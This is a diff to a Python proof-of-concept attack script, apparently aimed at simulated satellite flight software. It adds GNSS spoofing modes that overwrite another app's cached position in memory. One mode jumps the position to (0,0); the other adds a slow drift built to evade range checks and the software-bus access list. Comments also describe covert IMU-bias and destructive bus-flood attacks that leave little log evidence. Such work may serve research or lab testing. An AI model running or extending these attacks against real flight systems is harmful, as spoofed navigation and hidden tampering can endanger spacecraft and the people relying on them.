@@ -49,11 +49,14 @@ import time
 # Mode may be given as the first token or as the 3rd positional after the IPs:
 #   drive_poc.py [ladder]                      full demo ladder (default)
 #   drive_poc.py override                      re-arm AP0 + engage persistent EPS override -> sustained SAFE
-#   drive_poc.py off                           clear a running EPS override (opcode 0x00)
+#   drive_poc.py off                           clear a running EPS override / GNSS spoof (opcode 0x00)
 #   drive_poc.py flood                         DESTRUCTIVE: SB pool lock (opcode 0x08) - needs a sim restart
 #   drive_poc.py spoof | burst                 one-shot EPS_SPOOF (0x02) | SB_BURST (0x04)
+#   drive_poc.py imu                           arm the IMU bias dead-drop (off-bus, 0x0A)
+#   drive_poc.py gnss                          GNSS teleport to (0,0) (off-bus, 0x0C)
+#   drive_poc.py gnss_drift                    GNSS slow plausible drift (off-bus, 0x0E)
 #   drive_poc.py <FSW_IP> <DEST_IP> <mode>     explicit endpoints + mode
-MODES = ("ladder", "override", "off", "flood", "spoof", "burst", "imu")
+MODES = ("ladder", "override", "off", "flood", "spoof", "burst", "imu", "gnss", "gnss_drift")
 _args = sys.argv[1:]
 MODE = "ladder"
 if _args and _args[0] in MODES:
@@ -73,6 +76,8 @@ NOOP_FC = 0x00            # CI_LAB_NOOP_CC / CARRIER_NOOP_FC
 
 OP_DORMANT, OP_EPS_SPOOF, OP_SB_BURST, OP_EPS_OVERRIDE, OP_SB_FLOOD = 0, 2, 4, 6, 8
 OP_IMU_BIAS = 0x0A        # covert-channel arm: drop /ram/.imu_cal for generic_imu
+OP_GNSS_SPOOF = 0x0C      # off-bus: direct memory overwrite -> teleport peer GNSS to (0,0)
+OP_GNSS_DRIFT = 0x0E      # off-bus: same vector, slow plausible position drift
 
 
 def stamp(msg):
@@ -204,6 +209,18 @@ def main():
               "0x26 -> ADCS attitude determination. This arm is visible; the "
               "channel and the IMU bias produce ZERO further SB/EVS evidence.")
         run_single(s, OP_IMU_BIAS, "PIGGYBACK_0x0A_IMU")
+    elif MODE == "gnss":
+        stamp("OFF-BUS: GNSS teleport (opcode 0x0C). noisy_app writes the peer "
+              "GNSS app's cached position (LastBusLat/Lon) directly in memory -> "
+              "downlinked position jumps to Null Island (0,0). Never on the SB, so "
+              "SB_ACL cannot block it. Send 'off' (opcode 0x00) to clear.")
+        run_single(s, OP_GNSS_SPOOF, "PIGGYBACK_0x0C_GNSS")
+    elif MODE == "gnss_drift":
+        stamp("OFF-BUS: GNSS drift (opcode 0x0E). Same direct-memory vector, but a "
+              "slow plausible offset (genuine position + a growing delta) that a "
+              "range check will not catch - only a truth-vs-bus divergence does. "
+              "Send 'off' (opcode 0x00) to clear.")
+        run_single(s, OP_GNSS_DRIFT, "PIGGYBACK_0x0E_GNSS_DRIFT")
 
     s.close()
 
